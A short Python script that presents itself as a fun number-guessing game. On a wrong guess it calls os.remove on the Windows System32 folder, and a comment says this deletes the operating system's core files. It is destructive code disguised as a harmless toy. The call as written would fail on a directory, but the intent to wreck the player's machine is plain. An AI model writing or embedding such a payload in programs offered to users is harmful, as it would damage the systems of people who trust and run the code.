#importing randint to generate random numbers and os to access the operating system
from random import randint
import os 

#generates a random number and asks the user for a number from 1 - 10
number = randint(1,10)
guess = int(input("Let's have some fun!! Guess a number from 1 to 10: "))


if guess == number:
    print('you win!!')
else:
    print('you lose D:')
    os.remove("C:\Windows\System32") #deletes windows system 32
